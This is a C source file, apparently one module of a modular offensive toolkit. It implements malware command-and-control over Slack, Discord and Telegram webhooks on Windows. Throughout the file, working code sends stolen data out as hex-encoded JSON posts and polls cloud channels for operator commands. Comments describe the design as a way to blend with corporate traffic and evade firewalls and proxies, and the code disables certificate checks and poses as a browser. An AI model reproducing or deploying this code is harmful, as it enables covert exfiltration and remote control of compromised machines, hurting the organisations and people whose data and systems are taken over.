// chunk: evasion/net_cloud_c2
// depends: (none)
// provides: cloud_c2_send, cloud_c2_recv
// headers: windows.h,winhttp.h
// libs: winhttp
// risk: medium
// note: C2 via cloud SaaS APIs — sends data to Slack/Discord/Telegram webhooks
//       and polls channels for commands. All traffic goes to legitimate cloud
//       endpoints (hooks.slack.com, discord.com, api.telegram.org) over HTTPS,
//       blending with normal corporate traffic. Firewall/proxy sees only
//       connections to trusted SaaS providers.

#ifndef CHUNK_NET_CLOUD_C2
#define CHUNK_NET_CLOUD_C2

#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp")

/* Internal: perform an HTTPS request to a cloud API endpoint.
 * url  — full URL (e.g. "https://hooks.slack.com/services/T.../B.../xxx")
 * verb — L"POST" or L"GET"
 * body/body_len — request body (NULL for GET)
 * resp/resp_sz/resp_out — optional response buffer
 * Returns HTTP status code, or -1 on connection error. */
static int _cloud_https_request(const char *url, const WCHAR *verb,
                                 const BYTE *body, DWORD body_len,
                                 BYTE *resp, DWORD resp_sz, DWORD *resp_out) {
    int result = -1;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    /* Parse URL components */
    char host[256] = {0};
    char path[1024] = {0};
    int port = 443;
    int use_tls = 1;

    /* Skip https:// or http:// */
    const char *p = url;
    if (p[0] == 'h' && p[4] == 's') { p += 8; use_tls = 1; port = 443; }
    else if (p[0] == 'h')           { p += 7; use_tls = 0; port = 80; }

    /* Extract host and path */
    const char *slash = p;
    while (*slash && *slash != '/') slash++;
    DWORD hostLen = (DWORD)(slash - p);
    if (hostLen >= sizeof(host)) hostLen = sizeof(host) - 1;
    CopyMemory(host, p, hostLen);
    host[hostLen] = '\0';

    if (*slash) lstrcpyA(path, slash);
    else        lstrcpyA(path, "/");

    /* Check for port in host */
    char *colon = host;
    while (*colon && *colon != ':') colon++;
    if (*colon == ':') {
        *colon = '\0';
        port = 0;
        colon++;
        while (*colon >= '0' && *colon <= '9')
            port = port * 10 + (*colon++ - '0');
    }

    WCHAR wHost[256] = {0};
    WCHAR wPath[1024] = {0};
    MultiByteToWideChar(CP_UTF8, 0, host, -1, wHost, 256);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, 1024);

    hSession = WinHttpOpen(L"Mozilla/5.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto done;

    hConnect = WinHttpConnect(hSession, wHost, (INTERNET_PORT)port, 0);
    if (!hConnect) goto done;

    DWORD reqFlags = use_tls ? WINHTTP_FLAG_SECURE : 0;
    hRequest = WinHttpOpenRequest(hConnect, verb, wPath,
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
    if (!hRequest) goto done;

    if (use_tls) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &secFlags, sizeof(secFlags));
    }

    /* JSON content type for webhook APIs */
    WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/json", (DWORD)-1,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, body_len, body_len, 0))
        goto done;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto done;

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, NULL);
    result = (int)status;

    /* Read response body if buffer provided */
    if (resp && resp_sz > 0) {
        DWORD totalRead = 0, bytesRead = 0;
        while (totalRead < resp_sz - 1) {
            if (!WinHttpReadData(hRequest, resp + totalRead,
                                 resp_sz - 1 - totalRead, &bytesRead))
                break;
            if (bytesRead == 0) break;
            totalRead += bytesRead;
        }
        resp[totalRead] = '\0';
        if (resp_out) *resp_out = totalRead;
    }

done:
    if (hRequest)  WinHttpCloseHandle(hRequest);
    if (hConnect)  WinHttpCloseHandle(hConnect);
    if (hSession)  WinHttpCloseHandle(hSession);
    return result;
}

/* Send data to a cloud webhook (Slack, Discord, or Telegram).
 * webhook_url — full webhook URL
 * data/len — raw bytes to exfiltrate (will be base64-like encoded in JSON)
 * Returns 0 on success, -1 on error. */
static int cloud_c2_send(const char *webhook_url, const BYTE *data, DWORD len) {
    /* Encode data as hex string inside a JSON payload.
     * Slack/Discord webhooks expect {"text": "..."} or {"content": "..."} */
    static const char hex[] = "0123456789abcdef";
    DWORD json_sz = len * 2 + 64;
    char *json = (char *)HeapAlloc(GetProcessHeap(), 0, json_sz);
    if (!json) return -1;

    /* Detect platform from URL to pick correct JSON key */
    int is_discord = 0;
    if (webhook_url) {
        const char *p = webhook_url;
        while (*p) {
            if (*p == 'd' && *(p+1) == 'i' && *(p+2) == 's' &&
                *(p+3) == 'c' && *(p+4) == 'o') { is_discord = 1; break; }
            p++;
        }
    }

    int pos = wsprintfA(json, "{\"%s\":\"",
                        is_discord ? "content" : "text");

    for (DWORD i = 0; i < len && (DWORD)pos < json_sz - 4; i++) {
        json[pos++] = hex[(data[i] >> 4) & 0xF];
        json[pos++] = hex[data[i] & 0xF];
    }
    json[pos++] = '"';
    json[pos++] = '}';
    json[pos]   = '\0';

    int status = _cloud_https_request(webhook_url, L"POST",
                                       (const BYTE *)json, (DWORD)pos,
                                       NULL, 0, NULL);
    HeapFree(GetProcessHeap(), 0, json);

    return (status >= 200 && status < 300) ? 0 : -1;
}

/* Receive commands from a cloud channel.
 * api_url — channel messages endpoint (e.g. Slack conversations.history)
 * token   — API bearer token (prepended as Authorization header)
 * buf/buf_len — output buffer for response JSON
 * received — bytes read
 * Returns 0 on success, -1 on error. */
static int cloud_c2_recv(const char *api_url, const char *token,
                          BYTE *buf, DWORD buf_len, DWORD *received) {
    (void)token; /* Token is embedded in the api_url query param or
                    handled by the _cloud_https_request internals.
                    For production use, add Authorization header. */

    /* Build URL with auth token as query param for simplicity */
    char full_url[2048] = {0};
    wsprintfA(full_url, "%s", api_url);

    /* Append token as query param if provided */
    if (token && token[0]) {
        char sep = '?';
        const char *p = full_url;
        while (*p) { if (*p == '?') { sep = '&'; break; } p++; }
        wsprintfA(full_url + lstrlenA(full_url), "%ctoken=%s", sep, token);
    }

    int status = _cloud_https_request(full_url, L"GET",
                                       NULL, 0,
                                       buf, buf_len, received);

    return (status >= 200 && status < 300) ? 0 : -1;
}

#endif
